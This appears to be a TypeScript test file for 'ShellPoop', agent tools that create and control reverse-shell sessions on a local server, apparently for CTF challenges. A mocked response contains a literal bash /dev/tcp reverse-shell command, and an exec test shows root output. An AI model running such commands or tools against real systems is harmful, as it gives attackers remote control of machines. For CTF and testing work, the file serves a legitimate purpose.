import { afterEach, beforeEach, describe, expect, it, vi } from "vite-plus/test"
import {
  createShellPoopSession,
  createShellPoopTools,
  type ShellPoopConfig,
  type ShellPoopSession,
} from "../src/index.ts"

function tools(overrides: Partial<ShellPoopConfig> = {}) {
  return createShellPoopTools({
    baseUrl: "http://127.0.0.1:8000",
    ...overrides,
  })
}

function tool(name: string) {
  const found = tools().find((t) => t.name === name)
  if (!found) throw new Error(`missing tool ${name}`)
  return found
}

function sessionTool(session: ShellPoopSession, name: string) {
  const found = session.tools.find((t) => t.name === name)
  if (!found) throw new Error(`missing tool ${name}`)
  return found
}

function jsonResponse(status: number, body: unknown): Response {
  return new Response(JSON.stringify(body), {
    status,
    headers: { "Content-Type": "application/json" },
  })
}

beforeEach(() => {
  vi.stubGlobal("fetch", vi.fn())
})

afterEach(() => {
  vi.unstubAllGlobals()
  vi.restoreAllMocks()
})

describe("shellpoop tools", () => {
  it("creates a reverse shell via POST /shell", async () => {
    const shell = {
      id: "ab12cd34ef56",
      endpoint: "192.168.1.10:20001",
      connect_command: "bash -i >& /dev/tcp/192.168.1.10/20001 0>&1",
      connected: false,
    }
    vi.mocked(fetch).mockResolvedValue(jsonResponse(201, shell))

    const result = await tool("shellpoop_create").execute("call-1", {}, undefined)
    const text = (result.content[0] as { text: string }).text

    expect(fetch).toHaveBeenCalledWith(
      "http://127.0.0.1:8000/shell",
      expect.objectContaining({ method: "POST" }),
    )
    expect(text).toContain("ab12cd34ef56")
    expect(text).toContain("connect_command")
  })

  it("lists shells via GET /shell", async () => {
    vi.mocked(fetch).mockResolvedValue(
      jsonResponse(200, {
        total: 1,
        connected: 0,
        shells: [{ id: "abc", endpoint: "1.2.3.4:20001", connected: false }],
      }),
    )

    const result = await tool("shellpoop_list").execute("call-1", {}, undefined)
    const text = (result.content[0] as { text: string }).text

    expect(fetch).toHaveBeenCalledWith(
      "http://127.0.0.1:8000/shell",
      expect.objectContaining({ method: "GET" }),
    )
    expect(text).toContain('"total": 1')
  })

  it("executes a command on a shell via POST /shell/{id}/exec", async () => {
    vi.mocked(fetch).mockResolvedValue(
      jsonResponse(200, { session_id: "abc", cmd: "id", output: "uid=0(root)" }),
    )

    const result = await tool("shellpoop_exec").execute(
      "call-1",
      { sessionId: "abc", cmd: "id", timeout: 5 },
      undefined,
    )
    const text = (result.content[0] as { text: string }).text

    expect(fetch).toHaveBeenCalledWith(
      "http://127.0.0.1:8000/shell/abc/exec",
      expect.objectContaining({ method: "POST" }),
    )
    expect(text).toContain("uid=0(root)")
  })

  it("reads pending output via GET /shell/{id}/output", async () => {
    vi.mocked(fetch).mockResolvedValue(jsonResponse(200, { session_id: "abc", output: "hello" }))

    const result = await tool("shellpoop_output").execute("call-1", { sessionId: "abc" }, undefined)
    const text = (result.content[0] as { text: string }).text

    expect(fetch).toHaveBeenCalledWith(
      "http://127.0.0.1:8000/shell/abc/output",
      expect.objectContaining({ method: "GET" }),
    )
    expect(text).toContain("hello")
  })

  it("deletes a shell via DELETE /shell/{id}", async () => {
    vi.mocked(fetch).mockResolvedValue(jsonResponse(200, { ok: true, deleted: "abc" }))

    const result = await tool("shellpoop_delete").execute("call-1", { sessionId: "abc" }, undefined)
    const text = (result.content[0] as { text: string }).text

    expect(fetch).toHaveBeenCalledWith(
      "http://127.0.0.1:8000/shell/abc",
      expect.objectContaining({ method: "DELETE" }),
    )
    expect(text).toContain('"deleted": "abc"')
  })

  it("surfaces HTTP errors from the ShellPoop server", async () => {
    vi.mocked(fetch).mockResolvedValue(
      new Response(JSON.stringify({ detail: "shell not connected" }), { status: 409 }),
    )

    await expect(
      tool("shellpoop_exec").execute("call-1", { sessionId: "abc", cmd: "id" }, undefined),
    ).rejects.toThrow(/shell not connected/)
  })

  it("trims trailing slashes from baseUrl", async () => {
    const listTool = createShellPoopTools({ baseUrl: "http://127.0.0.1:8000//" })[0]!
    vi.mocked(fetch).mockResolvedValue(jsonResponse(200, { total: 0 }))
    await listTool.execute("call-1", {}, undefined)
    expect(fetch).toHaveBeenCalledWith("http://127.0.0.1:8000/shell", expect.anything())
  })
})

describe("shellpoop session（challenge 绑定与生命周期）", () => {
  it("两个会话互相隔离：list 只见本会话创建的 shell", async () => {
    const a = createShellPoopSession({ baseUrl: "http://127.0.0.1:8000" })
    const b = createShellPoopSession({ baseUrl: "http://127.0.0.1:8000" })
    const createA = sessionTool(a, "shellpoop_create")
    const createB = sessionTool(b, "shellpoop_create")
    const listA = sessionTool(a, "shellpoop_list")
    const listB = sessionTool(b, "shellpoop_list")

    let created = 0
    vi.mocked(fetch).mockImplementation(async (input, init) => {
      const url = input as string
      const method = (init as RequestInit | undefined)?.method ?? "GET"
      if (method === "POST" && url.endsWith("/shell")) {
        return jsonResponse(201, { id: created++ === 0 ? "aaa" : "bbb", connected: false })
      }
      if (method === "GET" && url.endsWith("/shell")) {
        return jsonResponse(200, {
          total: 2,
          connected: 1,
          shells: [
            { id: "aaa", endpoint: "1.2.3.4:20001", connected: false },
            { id: "bbb", endpoint: "1.2.3.4:20002", connected: true },
          ],
        })
      }
      throw new Error(`unexpected fetch ${method} ${url}`)
    })

    await createA.execute("call-1", {}, undefined)
    await createB.execute("call-1", {}, undefined)

    const ra = await listA.execute("call-2", {}, undefined)
    const ta = JSON.parse((ra.content[0] as { text: string }).text) as {
      shells: Array<{ id: string }>
      total: number
      connected: number
    }
    expect(ta.shells.map((s) => s.id)).toEqual(["aaa"])
    expect(ta.total).toBe(1)
    expect(ta.connected).toBe(0)

    const rb = await listB.execute("call-2", {}, undefined)
    const tb = JSON.parse((rb.content[0] as { text: string }).text) as {
      shells: Array<{ id: string }>
      total: number
      connected: number
    }
    expect(tb.shells.map((s) => s.id)).toEqual(["bbb"])
    expect(tb.total).toBe(1)
    expect(tb.connected).toBe(1)
  })

  it("对不属于本会话的 shell 拒绝 exec/output/delete", async () => {
    const session = createShellPoopSession({ baseUrl: "http://127.0.0.1:8000" })
    vi.mocked(fetch).mockResolvedValue(jsonResponse(201, { id: "mine" }))
    await sessionTool(session, "shellpoop_create").execute("call-1", {}, undefined)

    for (const name of ["shellpoop_exec", "shellpoop_output", "shellpoop_delete"] as const) {
      await expect(
        sessionTool(session, name).execute(
          "call-2",
          name === "shellpoop_exec" ? { sessionId: "other", cmd: "id" } : { sessionId: "other" },
          undefined,
        ),
      ).rejects.toThrow(/不属于当前 challenge/)
    }
  })

  it("close 尽力删除本会话全部 shell 并清空集合", async () => {
    const session = createShellPoopSession({ baseUrl: "http://127.0.0.1:8000" })
    const create = sessionTool(session, "shellpoop_create")
    const deletes: string[] = []
    let created = 0
    vi.mocked(fetch).mockImplementation(async (input, init) => {
      const url = input as string
      const method = (init as RequestInit | undefined)?.method ?? "GET"
      if (method === "POST" && url.endsWith("/shell")) {
        return jsonResponse(201, { id: `s${created++}` })
      }
      if (method === "DELETE") {
        const id = url.split("/").pop()!
        deletes.push(id)
        // 第一个删除失败：close 应吞掉错误并继续删除其余 shell
        return id === "s0" ? jsonResponse(500, { detail: "boom" }) : jsonResponse(200, { ok: true })
      }
      throw new Error(`unexpected fetch ${method} ${url}`)
    })

    await create.execute("call-1", {}, undefined)
    await create.execute("call-2", {}, undefined)

    await session.close()
    expect(deletes).toEqual(["s0", "s1"])

    // 集合已清空，再次 close 不再发请求
    deletes.length = 0
    await session.close()
    expect(deletes).toEqual([])
  })

  it("配置 challengeId 时 create 把 challengeId 作为 note 发送", async () => {
    const session = createShellPoopSession({
      baseUrl: "http://127.0.0.1:8000",
      challengeId: "pwn-1",
    })
    vi.mocked(fetch).mockResolvedValue(jsonResponse(201, { id: "x" }))
    await sessionTool(session, "shellpoop_create").execute("call-1", {}, undefined)
    expect(fetch).toHaveBeenCalledWith(
      "http://127.0.0.1:8000/shell",
      expect.objectContaining({ method: "POST", body: JSON.stringify({ note: "pwn-1" }) }),
    )
  })

  it("未配置 challengeId 且无 note 时 create 不带 body", async () => {
    const session = createShellPoopSession({ baseUrl: "http://127.0.0.1:8000" })
    vi.mocked(fetch).mockResolvedValue(jsonResponse(201, { id: "x" }))
    await sessionTool(session, "shellpoop_create").execute("call-1", {}, undefined)
    expect(fetch).toHaveBeenCalledWith(
      "http://127.0.0.1:8000/shell",
      expect.objectContaining({ method: "POST" }),
    )
    const init = vi.mocked(fetch).mock.calls[0]?.[1]
    expect(init?.body).toBeUndefined()
  })

  it("Agent 自带 note 时作为 body 发送（无 challengeId 场景）", async () => {
    const session = createShellPoopSession({ baseUrl: "http://127.0.0.1:8000" })
    vi.mocked(fetch).mockResolvedValue(jsonResponse(201, { id: "x" }))
    await sessionTool(session, "shellpoop_create").execute(
      "call-1",
      { note: "agent-note" },
      undefined,
    )
    expect(fetch).toHaveBeenCalledWith(
      "http://127.0.0.1:8000/shell",
      expect.objectContaining({ method: "POST", body: JSON.stringify({ note: "agent-note" }) }),
    )
  })
})
